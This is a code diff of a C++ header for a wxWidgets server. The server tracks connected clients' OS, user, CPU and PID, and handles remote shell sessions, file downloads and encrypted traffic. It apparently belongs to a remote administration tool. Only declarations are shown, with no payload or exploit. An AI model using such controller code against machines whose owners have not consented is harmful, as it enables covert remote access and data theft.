@@ -1,4 +1,5 @@
 #include "headers.hpp"
+#include "frame_client.hpp"
 #ifndef _SERVER_H
 #define _SERVER_H
 
@@ -25,6 +26,7 @@ struct Cliente{
     std::string _strSo;
     std::string _strUser;
     std::string _strCpu;
+    std::string _strPID;
     bool _isBusy = false;
     bool _isRunningShell = false;
     std::unordered_map<std::string, struct Archivo_Descarga2> um_Archivos_Descarga2;
@@ -67,10 +69,43 @@ class MyListCtrl: public wxListCtrl{
         wxDECLARE_EVENT_TABLE();
 };
 
+class Cliente_Handler {
+    private:
+        
+        std::thread p_thHilo;
+        
+    public:
+
+        std::mutex mt_Archivos;
+
+        FrameCliente* n_Frame = nullptr;
+
+        std::unordered_map<std::string, struct Archivo_Descarga2> um_Archivos_Descarga2;
+        
+        struct Cliente p_Cliente;
+        bool isRunning = false;
+
+        Cliente_Handler(struct Cliente s_cliente) : p_Cliente(s_cliente) {}
+
+        void Spawn_Handler();
+        void Spawn_Thread();
+        void CrearFrame(std::string strTitle, std::string strID);
+        void EscribirSalidShell(std::string strSalida);
+
+        void Log(std::string strMsg) {
+            std::cout << "[" << this->p_thHilo.get_id() << "] " << strMsg << std::endl;
+        }
+
+        void Join_Thread() {
+            if (this->p_thHilo.joinable()) {
+                this->p_thHilo.join();
+            }
+        }
+};
+
 class Servidor{
     private:
-        std::mutex count_mutex;
-
+        
         SOCKET sckSocket = INVALID_SOCKET;
         u_int uiPuertoLocal = 0;
         WSADATA wsa;
@@ -88,19 +123,20 @@ class Servidor{
 
         std::mutex p_mutex;
         std::mutex p_transfers;
+        std::mutex count_mutex;
 
         std::unordered_map<SOCKET, struct Cliente> um_Clientes;
 
         std::vector<struct TransferStatus> vcTransferencias;
+        std::vector<Cliente_Handler*> vc_Clientes;
         
         bool p_Escuchando = false;
         bool p_Transferencias = false;
-        bool   m_Iniciar();
-        ClientConInfo m_Aceptar();
         int iCount = 0;
 
         std::thread thListener;
         std::thread thPing;
+        std::thread thCleanVC;
         std::thread thTransfers;
       
 
@@ -110,6 +146,7 @@ class Servidor{
         void m_JoinThreads();
         void m_Escucha();
         void m_Ping();
+        void m_CleanVector();
         void m_MonitorTransferencias();
 
         //Manipular listview
@@ -129,6 +166,9 @@ class Servidor{
         ByteArray bDec(const unsigned char* pInput, size_t pLen);
         ByteArray bEnc(const unsigned char* pInput, size_t pLen);
 
+        //Server
+        bool   m_Iniciar();
+        ClientConInfo m_Aceptar();
         void m_CerrarConexiones();
         void m_CerrarConexion(SOCKET& pSocket);
 
